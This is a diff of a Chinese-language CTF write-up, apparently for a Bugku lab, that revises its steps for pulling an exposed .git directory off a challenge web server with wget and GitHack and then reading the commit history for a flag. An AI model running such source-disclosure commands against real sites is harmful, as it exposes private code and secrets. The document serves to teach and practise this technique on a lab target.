@@ -60,17 +60,18 @@ refs/
 ### 3. 恢复 Git 仓库
 **方法一：使用 wget 下载 .git 目录（本次使用的方法）**
 ```bash
-# 1. 回到桌面
+# 1. 进入桌面
 cd ~/Desktop
 
-# 2. 用 wget 下载整个 .git 目录
-wget -r -np -nH --cut-dirs=0 -R "index.html*" http://160.202.254.160:17030/.git/
+# 2.创建目录并进入
+mkdir bugku_source && cd bugku_source
 
-# 3. 进入下载的目录
-cd 160.202.254.160:17030
+# 3. 用 wget 下载整个 .git 目录
+wget -r -np -nH --cut-dirs=0 -R "index.html*" http://160.202.254.160:17030/.git/ 
 
 # 4. 恢复 Git 仓库文件
 git checkout .
+# 输出: Updated 2 paths from the index
 ```
 **参数说明：**
 | 参数                 | 作用               |
@@ -94,6 +95,7 @@ python GitHack.py http://160.202.254.160:17030/.git/
 ```
 **查看恢复的文件：**
 ```bash
+cd 160.202.254.160:17030
 ls
 # 输出：flag.txt  index.html
 
@@ -101,6 +103,37 @@ cat flag.txt
 # 输出：flag{not_here}  （假的 flag）
 
 cat index.html
+```
+**进入GitHack 生成的目录:**
+```bash
+# 1. 回到桌面
+cd ~/Desktop
+
+# 2. 查找 GitHack 生成的目录
+ls -la
+
+# 输出:
+# total 16
+# drwxr-xr-x  4 kali kali 4096 Jun  7 08:40 .
+# drwx------ 15 kali kali 4096 Jun  7 08:45 ..
+# drwxrwxr-x  8 kali kali 4096 Jun  7 07:06 .git
+# drwxrwxr-x  5 kali kali 4096 Jun  7 08:41 GitHack
+
+# 3.进入.git目录
+cd .git
+
+# 4.查看所有 commit
+git log --all --oneline
+# 输出：
+# d256328 (HEAD -> master) flag is here?
+# e0b8e8e this is index.html
+
+# 5.查看某个具体 commit 的内容
+git show d256328
+# 输出：       
+# commit d256328b55ccd8c985237e870a16a3e840f2aa2a (HEAD -> master)
+# Author: vFREE <flag@flag.com>
+# Date:   Sun Jan 17 20:30:53 2021 +0800
 ```
 
 ### 4. 分析 Git 历史记录
